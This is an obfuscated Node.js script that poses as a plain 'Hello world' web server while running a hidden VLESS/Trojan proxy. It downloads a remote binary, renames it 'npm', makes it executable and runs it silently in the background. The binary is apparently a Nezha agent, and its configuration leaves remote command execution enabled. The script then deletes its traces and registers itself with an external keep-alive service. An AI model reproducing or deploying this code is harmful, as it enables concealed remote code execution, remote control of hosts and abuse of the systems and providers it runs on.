const _0x29c856=_0x56a1;(function(_0xeb5896,_0x65ada0){const _0x45cad4=_0x56a1,_0x4fcb1f=_0xeb5896();while(!![]){try{const _0x3494ad=-parseInt(_0x45cad4(0x1d6))/0x1+-parseInt(_0x45cad4(0x201))/0x2+parseInt(_0x45cad4(0x228))/0x3*(-parseInt(_0x45cad4(0x1e3))/0x4)+-parseInt(_0x45cad4(0x1dd))/0x5+parseInt(_0x45cad4(0x212))/0x6+-parseInt(_0x45cad4(0x1c4))/0x7+parseInt(_0x45cad4(0x1c5))/0x8;if(_0x3494ad===_0x65ada0)break;else _0x4fcb1f['push'](_0x4fcb1f['shift']());}catch(_0x474e17){_0x4fcb1f['push'](_0x4fcb1f['shift']());}}}(_0x2c38,0x89d73));function _0x56a1(_0x45f539,_0x285332){_0x45f539=_0x45f539-0x1c2;const _0x2c38d5=_0x2c38();let _0x56a195=_0x2c38d5[_0x45f539];return _0x56a195;}const os=require('os'),http=require(_0x29c856(0x1fa)),fs=require('fs'),axios=require(_0x29c856(0x1c2)),net=require(_0x29c856(0x22a)),path=require(_0x29c856(0x237)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x29c856(0x226)][_0x29c856(0x1da)]||_0x29c856(0x1e6),NEZHA_SERVER=process[_0x29c856(0x226)][_0x29c856(0x1cf)]||'',NEZHA_PORT=process[_0x29c856(0x226)][_0x29c856(0x235)]||'',NEZHA_KEY=process[_0x29c856(0x226)][_0x29c856(0x1d9)]||'',DOMAIN=process[_0x29c856(0x226)][_0x29c856(0x20a)]||_0x29c856(0x1d5),AUTO_ACCESS=process[_0x29c856(0x226)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x29c856(0x1ec)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x29c856(0x226)][_0x29c856(0x1ea)]||'ssubbb',NAME=process[_0x29c856(0x226)]['NAME']||'',PORT=process[_0x29c856(0x226)][_0x29c856(0x1f8)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x313c5e=_0x29c856;try{const _0xf04c1c=await axios[_0x313c5e(0x1fc)](_0x313c5e(0x227)),_0x22d1a6=_0xf04c1c['data'];ISP=(_0x22d1a6[_0x313c5e(0x23b)]+'-'+_0x22d1a6[_0x313c5e(0x1fb)])[_0x313c5e(0x209)](/ /g,'_');}catch(_0x3a08a7){ISP='Unknown';}};GetISP();const httpServer=http[_0x29c856(0x1f1)]((_0x30f5fe,_0x279bdf)=>{const _0x45cb85=_0x29c856;if(_0x30f5fe[_0x45cb85(0x236)]==='/'){const _0x5abf83=path['join'](__dirname,_0x45cb85(0x20c));fs[_0x45cb85(0x22e)](_0x5abf83,'utf8',(_0x1028b6,_0xd4bb9)=>{const _0x299303=_0x45cb85;if(_0x1028b6){_0x279bdf[_0x299303(0x215)](0xc8,{'Content-Type':_0x299303(0x23a)}),_0x279bdf[_0x299303(0x213)](_0x299303(0x219));return;}_0x279bdf[_0x299303(0x215)](0xc8,{'Content-Type':_0x299303(0x23a)}),_0x279bdf[_0x299303(0x213)](_0xd4bb9);});return;}else{if(_0x30f5fe['url']==='/'+SUB_PATH){const _0x5022f5=NAME?NAME+'-'+ISP:ISP,_0xde0582='vless://'+UUID+'@'+DOMAIN+_0x45cb85(0x21b)+DOMAIN+_0x45cb85(0x1ca)+DOMAIN+_0x45cb85(0x218)+WSPATH+'#'+_0x5022f5,_0x3249df=_0x45cb85(0x217)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x45cb85(0x1ca)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5022f5,_0x22ae04=_0xde0582+'\x0a'+_0x3249df,_0x28ec5d=Buffer['from'](_0x22ae04)[_0x45cb85(0x1cc)](_0x45cb85(0x1d1));_0x279bdf[_0x45cb85(0x215)](0xc8,{'Content-Type':_0x45cb85(0x1fd)}),_0x279bdf[_0x45cb85(0x213)](_0x28ec5d+'\x0a');}else _0x279bdf[_0x45cb85(0x215)](0x194,{'Content-Type':_0x45cb85(0x1fd)}),_0x279bdf[_0x45cb85(0x213)](_0x45cb85(0x1fe));}}),wss=new WebSocket[(_0x29c856(0x211))]({'server':httpServer}),uuid=UUID[_0x29c856(0x209)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x29c856(0x20e)];function resolveHost(_0x3d1cd8){return new Promise((_0x51ffb6,_0x4a21ee)=>{const _0x3491e6=_0x56a1;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3491e6(0x238)](_0x3d1cd8)){_0x51ffb6(_0x3d1cd8);return;}let _0x150e36=0x0;function _0x14e046(){const _0x8a8afb=_0x3491e6;if(_0x150e36>=DNS_SERVERS[_0x8a8afb(0x1e9)]){_0x4a21ee(new Error(_0x8a8afb(0x1d3)+_0x3d1cd8+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2c0322=DNS_SERVERS[_0x150e36];_0x150e36++;const _0x3bac1b='https://dns.google/resolve?name='+encodeURIComponent(_0x3d1cd8)+_0x8a8afb(0x21e);axios[_0x8a8afb(0x1fc)](_0x3bac1b,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x8a8afb(0x1f2)](_0x543ceb=>{const _0x4d9656=_0x8a8afb,_0x1261bb=_0x543ceb[_0x4d9656(0x200)];if(_0x1261bb[_0x4d9656(0x1e5)]===0x0&&_0x1261bb[_0x4d9656(0x22c)]&&_0x1261bb[_0x4d9656(0x22c)][_0x4d9656(0x1e9)]>0x0){const _0x26d955=_0x1261bb[_0x4d9656(0x22c)][_0x4d9656(0x21c)](_0x36cc24=>_0x36cc24[_0x4d9656(0x239)]===0x1);if(_0x26d955){_0x51ffb6(_0x26d955['data']);return;}}_0x14e046();})['catch'](_0x6ac7e0=>{_0x14e046();});}_0x14e046();});}function handleVlessConnection(_0x24219e,_0x5b8605){const _0x48b631=_0x29c856,[_0x105942]=_0x5b8605,_0x44f6e7=_0x5b8605['slice'](0x1,0x11);if(!_0x44f6e7[_0x48b631(0x233)]((_0x47a538,_0x34942d)=>_0x47a538==parseInt(uuid[_0x48b631(0x1d8)](_0x34942d*0x2,0x2),0x10)))return![];let _0x1dc7b5=_0x5b8605[_0x48b631(0x1d7)](0x11,0x12)[_0x48b631(0x231)]()+0x13;const _0x30c8db=_0x5b8605[_0x48b631(0x1d7)](_0x1dc7b5,_0x1dc7b5+=0x2)[_0x48b631(0x1f0)](0x0),_0x152eb2=_0x5b8605[_0x48b631(0x1d7)](_0x1dc7b5,_0x1dc7b5+=0x1)['readUInt8'](),_0x1944ff=_0x152eb2==0x1?_0x5b8605['slice'](_0x1dc7b5,_0x1dc7b5+=0x4)['join']('.'):_0x152eb2==0x2?new TextDecoder()[_0x48b631(0x221)](_0x5b8605['slice'](_0x1dc7b5+0x1,_0x1dc7b5+=0x1+_0x5b8605['slice'](_0x1dc7b5,_0x1dc7b5+0x1)[_0x48b631(0x231)]())):_0x152eb2==0x3?_0x5b8605[_0x48b631(0x1d7)](_0x1dc7b5,_0x1dc7b5+=0x10)[_0x48b631(0x205)]((_0x3821c6,_0x35d100,_0x49d4e0,_0x129f8d)=>_0x49d4e0%0x2?_0x3821c6[_0x48b631(0x230)](_0x129f8d[_0x48b631(0x1d7)](_0x49d4e0-0x1,_0x49d4e0+0x1)):_0x3821c6,[])[_0x48b631(0x214)](_0x2d2163=>_0x2d2163[_0x48b631(0x1f0)](0x0)['toString'](0x10))[_0x48b631(0x1ce)](':'):'';_0x24219e[_0x48b631(0x210)](new Uint8Array([_0x105942,0x0]));const _0x3a4c41=createWebSocketStream(_0x24219e);return resolveHost(_0x1944ff)[_0x48b631(0x1f2)](_0x17d5e4=>{const _0x2d5075=_0x48b631;net[_0x2d5075(0x1f9)]({'host':_0x17d5e4,'port':_0x30c8db},function(){const _0x143510=_0x2d5075;this['write'](_0x5b8605[_0x143510(0x1d7)](_0x1dc7b5)),_0x3a4c41['on'](_0x143510(0x223),()=>{})['pipe'](this)['on'](_0x143510(0x223),()=>{})['pipe'](_0x3a4c41);})['on'](_0x2d5075(0x223),()=>{});})[_0x48b631(0x1f4)](_0x338970=>{const _0x27a91f=_0x48b631;net[_0x27a91f(0x1f9)]({'host':_0x1944ff,'port':_0x30c8db},function(){const _0x40fdc3=_0x27a91f;this[_0x40fdc3(0x1de)](_0x5b8605[_0x40fdc3(0x1d7)](_0x1dc7b5)),_0x3a4c41['on'](_0x40fdc3(0x223),()=>{})[_0x40fdc3(0x22f)](this)['on'](_0x40fdc3(0x223),()=>{})[_0x40fdc3(0x22f)](_0x3a4c41);})['on'](_0x27a91f(0x223),()=>{});}),!![];}function handleTrojanConnection(_0x40bca2,_0x393fe8){const _0xa53fff=_0x29c856;try{if(_0x393fe8['length']<0x3a)return![];const _0x5bd081=_0x393fe8['slice'](0x0,0x38)[_0xa53fff(0x1cc)](),_0x17b27d=[UUID];let _0x5242bc=null;for(const _0x4da7a9 of _0x17b27d){const _0x368538=crypto[_0xa53fff(0x1e0)](_0xa53fff(0x207))[_0xa53fff(0x1d4)](_0x4da7a9)[_0xa53fff(0x21f)](_0xa53fff(0x1d2));if(_0x368538===_0x5bd081){_0x5242bc=_0x4da7a9;break;}}if(!_0x5242bc)return![];let _0x550ffd=0x38;_0x393fe8[_0x550ffd]===0xd&&_0x393fe8[_0x550ffd+0x1]===0xa&&(_0x550ffd+=0x2);const _0x26dfab=_0x393fe8[_0x550ffd];if(_0x26dfab!==0x1)return![];_0x550ffd+=0x1;const _0x88e500=_0x393fe8[_0x550ffd];_0x550ffd+=0x1;let _0x6861ef,_0x2a3b3f;if(_0x88e500===0x1)_0x6861ef=_0x393fe8[_0xa53fff(0x1d7)](_0x550ffd,_0x550ffd+0x4)[_0xa53fff(0x1ce)]('.'),_0x550ffd+=0x4;else{if(_0x88e500===0x3){const _0x34c5db=_0x393fe8[_0x550ffd];_0x550ffd+=0x1,_0x6861ef=_0x393fe8['slice'](_0x550ffd,_0x550ffd+_0x34c5db)['toString'](),_0x550ffd+=_0x34c5db;}else{if(_0x88e500===0x4)_0x6861ef=_0x393fe8['slice'](_0x550ffd,_0x550ffd+0x10)[_0xa53fff(0x205)]((_0x3a8178,_0x1ce120,_0x50bee8,_0x4565ae)=>_0x50bee8%0x2?_0x3a8178[_0xa53fff(0x230)](_0x4565ae[_0xa53fff(0x1d7)](_0x50bee8-0x1,_0x50bee8+0x1)):_0x3a8178,[])[_0xa53fff(0x214)](_0x3ca8fa=>_0x3ca8fa[_0xa53fff(0x1f0)](0x0)[_0xa53fff(0x1cc)](0x10))[_0xa53fff(0x1ce)](':'),_0x550ffd+=0x10;else return![];}}_0x2a3b3f=_0x393fe8[_0xa53fff(0x1f0)](_0x550ffd),_0x550ffd+=0x2;_0x550ffd<_0x393fe8[_0xa53fff(0x1e9)]&&_0x393fe8[_0x550ffd]===0xd&&_0x393fe8[_0x550ffd+0x1]===0xa&&(_0x550ffd+=0x2);const _0x417475=createWebSocketStream(_0x40bca2);return resolveHost(_0x6861ef)[_0xa53fff(0x1f2)](_0x1bae26=>{const _0x5c0838=_0xa53fff;net[_0x5c0838(0x1f9)]({'host':_0x1bae26,'port':_0x2a3b3f},function(){const _0x4e4591=_0x5c0838;_0x550ffd<_0x393fe8[_0x4e4591(0x1e9)]&&this[_0x4e4591(0x1de)](_0x393fe8[_0x4e4591(0x1d7)](_0x550ffd)),_0x417475['on'](_0x4e4591(0x223),()=>{})[_0x4e4591(0x22f)](this)['on']('error',()=>{})[_0x4e4591(0x22f)](_0x417475);})['on'](_0x5c0838(0x223),()=>{});})[_0xa53fff(0x1f4)](_0x3caf92=>{const _0x42a4e9=_0xa53fff;net[_0x42a4e9(0x1f9)]({'host':_0x6861ef,'port':_0x2a3b3f},function(){const _0x574c33=_0x42a4e9;_0x550ffd<_0x393fe8['length']&&this[_0x574c33(0x1de)](_0x393fe8[_0x574c33(0x1d7)](_0x550ffd)),_0x417475['on'](_0x574c33(0x223),()=>{})[_0x574c33(0x22f)](this)['on'](_0x574c33(0x223),()=>{})[_0x574c33(0x22f)](_0x417475);})['on'](_0x42a4e9(0x223),()=>{});}),!![];}catch(_0x2c49d6){return![];}}wss['on'](_0x29c856(0x1c3),(_0x422821,_0x3f8456)=>{const _0x48bda4=_0x29c856,_0x414804=_0x3f8456['url']||'';_0x422821[_0x48bda4(0x1ff)](_0x48bda4(0x1e2),_0x29cdf9=>{const _0xc70b56=_0x48bda4;if(_0x29cdf9[_0xc70b56(0x1e9)]>0x11&&_0x29cdf9[0x0]===0x0){const _0x21f903=_0x29cdf9[_0xc70b56(0x1d7)](0x1,0x11),_0x1ed0fe=_0x21f903[_0xc70b56(0x233)]((_0x434077,_0x32c66e)=>_0x434077==parseInt(uuid['substr'](_0x32c66e*0x2,0x2),0x10));if(_0x1ed0fe){!handleVlessConnection(_0x422821,_0x29cdf9)&&_0x422821[_0xc70b56(0x1dc)]();return;}}!handleTrojanConnection(_0x422821,_0x29cdf9)&&_0x422821[_0xc70b56(0x1dc)]();})['on'](_0x48bda4(0x223),()=>{});});const getDownloadUrl=()=>{const _0x3dc7fc=_0x29c856,_0xa17d49=os['arch']();return _0xa17d49==='arm'||_0xa17d49===_0x3dc7fc(0x1ed)||_0xa17d49===_0x3dc7fc(0x202)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x3dc7fc(0x22b):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3295d7=_0x29c856;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3b782f=getDownloadUrl(),_0x554f51=await axios({'method':_0x3295d7(0x1fc),'url':_0x3b782f,'responseType':'stream'}),_0x52c078=fs[_0x3295d7(0x1e1)]('npm');return _0x554f51[_0x3295d7(0x200)][_0x3295d7(0x22f)](_0x52c078),new Promise((_0x49978a,_0x1f7e0c)=>{const _0x41dcd9=_0x3295d7;_0x52c078['on'](_0x41dcd9(0x1c7),()=>{const _0x9079c3=_0x41dcd9;console[_0x9079c3(0x204)](_0x9079c3(0x1c8)),exec(_0x9079c3(0x20f),_0x3011b1=>{if(_0x3011b1)_0x1f7e0c(_0x3011b1);_0x49978a();});}),_0x52c078['on'](_0x41dcd9(0x223),_0x1f7e0c);});}catch(_0x405267){throw _0x405267;}},runnz=async()=>{const _0x3f89b4=_0x29c856;try{const _0x53ba9d=execSync(_0x3f89b4(0x20d),{'encoding':_0x3f89b4(0x1cb)});if(_0x53ba9d[_0x3f89b4(0x20b)]()!==''){console[_0x3f89b4(0x204)](_0x3f89b4(0x206));return;}}catch(_0x633c65){}await downloadFile();let _0x663b82='',_0x4c6aad=[_0x3f89b4(0x222),_0x3f89b4(0x1e4),_0x3f89b4(0x232),_0x3f89b4(0x203),_0x3f89b4(0x22d),_0x3f89b4(0x1ee)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xfb56ad=_0x4c6aad[_0x3f89b4(0x1eb)](NEZHA_PORT)?_0x3f89b4(0x224):'';_0x663b82=_0x3f89b4(0x1f6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3f89b4(0x1db)+NEZHA_KEY+'\x20'+_0xfb56ad+_0x3f89b4(0x225);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x446185=NEZHA_SERVER[_0x3f89b4(0x1eb)](':')?NEZHA_SERVER[_0x3f89b4(0x1cd)](':')[_0x3f89b4(0x1f7)]():'',_0x4d38f0=_0x4c6aad[_0x3f89b4(0x1eb)](_0x446185)?'true':_0x3f89b4(0x216),_0x34202c=_0x3f89b4(0x1f5)+NEZHA_KEY+_0x3f89b4(0x1d0)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4d38f0+_0x3f89b4(0x229)+UUID;fs[_0x3f89b4(0x1e7)](_0x3f89b4(0x1c9),_0x34202c);}_0x663b82=_0x3f89b4(0x234);}else{console[_0x3f89b4(0x204)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x663b82,{'shell':'/bin/bash'},_0x39ab53=>{const _0x47fec7=_0x3f89b4;if(_0x39ab53)console[_0x47fec7(0x223)](_0x47fec7(0x1e8),_0x39ab53);else console[_0x47fec7(0x204)](_0x47fec7(0x21d));});}catch(_0x4f0eaf){console[_0x3f89b4(0x223)](_0x3f89b4(0x1c6)+_0x4f0eaf);}};async function addAccessTask(){const _0x400c27=_0x29c856;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5cf2cb=_0x400c27(0x1ef)+DOMAIN;try{const _0x150e4a=await axios[_0x400c27(0x208)](_0x400c27(0x220),{'url':_0x5cf2cb},{'headers':{'Content-Type':'application/json'}});console[_0x400c27(0x204)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x316372){}}const delFiles=()=>{const _0x473a64=_0x29c856;fs['unlink']('npm',()=>{}),fs[_0x473a64(0x1df)](_0x473a64(0x1c9),()=>{});};function _0x2c38(){const _0x4113e3=['npm\x20download\x20successfully','config.yaml','&fp=chrome&type=ws&host=','utf-8','toString','split','join','NEZHA_SERVER','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','base64','hex','Failed\x20to\x20resolve\x20','update','giga.ze.ip-ddns.com','851326rkoHbf','slice','substr','NEZHA_KEY','UUID','\x20-p\x20','close','4211805ayYLsT','write','unlink','createHash','createWriteStream','message','647728YNprTE','8443','Status','5efabea4-f6d4-91fd-b8f0-17e004c89c60','writeFileSync','npm\x20running\x20error:','length','SUB_PATH','includes','WSPATH','arm64','2053','https://','readUInt16BE','createServer','then','listen','catch','client_secret:\x20','setsid\x20nohup\x20./npm\x20-s\x20','pop','PORT','connect','http','isp','get','text/plain','Not\x20Found\x0a','once','data','240156UpOlaY','aarch64','2087','log','reduce','npm\x20is\x20already\x20running,\x20skip\x20running...','sha224','post','replace','DOMAIN','trim','index.html','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1.1.1.1','chmod\x20+x\x20npm','send','Server','2357730ORZMZU','end','map','writeHead','false','trojan://','&path=%2F','Hello\x20world!','Server\x20is\x20running\x20on\x20port\x20',':443?encryption=none&security=tls&sni=','find','npm\x20is\x20running','&type=A','digest','https://oooo.serv00.net/add-url','decode','443','error','--tls','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','https://api.ip.sb/geoip','12LNCtpP','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','net','https://amd64.ssss.nyc.mn/v1','Answer','2083','readFile','pipe','concat','readUInt8','2096','every','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','url','path','test','type','text/html','country_code','axios','connection','1930873NYiDoF','23271776tABjFG','error:\x20','finish'];_0x2c38=function(){return _0x4113e3;};return _0x2c38();}httpServer[_0x29c856(0x1f3)](PORT,()=>{const _0xd79f37=_0x29c856;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xd79f37(0x204)](_0xd79f37(0x21a)+PORT);});
